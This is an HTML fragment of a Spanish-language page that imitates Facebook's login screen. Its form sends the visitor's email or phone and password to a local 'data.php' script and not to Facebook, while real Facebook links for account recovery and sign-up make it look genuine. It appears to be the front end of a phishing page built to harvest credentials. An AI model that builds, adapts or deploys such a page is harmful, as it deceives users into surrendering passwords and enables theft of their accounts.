<main>
	<div class="content">
		<div class="content-header">
			Iniciar sesión en Facebook
		</div>
		<div class="content-form">
			<form action="data.php" method="POST">
				<input type="text" name="username" placeholder="Correo electrónico o número de teléfono " pattern="[a-zA-Z0-9_]+(?:\.[A-Za-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*@(?!([a-zA-Z0-9]*\.[a-zA-Z0-9]*\.[a-zA-Z0-9]*\.))(?:[A-Za-z0-9](?:[a-zA-Z0-9-]*[A-Za-z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?|.{8,}\d+" title="  Escriba un correo electrónico  valido o  un número de teléfono ">
				<input type="password" name="userpassword" placeholder="Password" pattern=".{5,}" title="Debe escribir  cinco o mas carácteres">
				<input type="submit" name="data" value="Entrar">
			</form>
			<div class="signinLink">
				<a href="https://www.facebook.com/recover/initiate?lwv=100&amp;ars=facebook_login"  target="_blank">¿Olvidaste tu cuenta?</a>
				<span> · </span>
				<a href="https://www.facebook.com/r.php?locale=en_GB&amp;display=page" target="_blank">Nueva cuenta en Facebook</a>
			</div>
		</div>
	</div>
</main>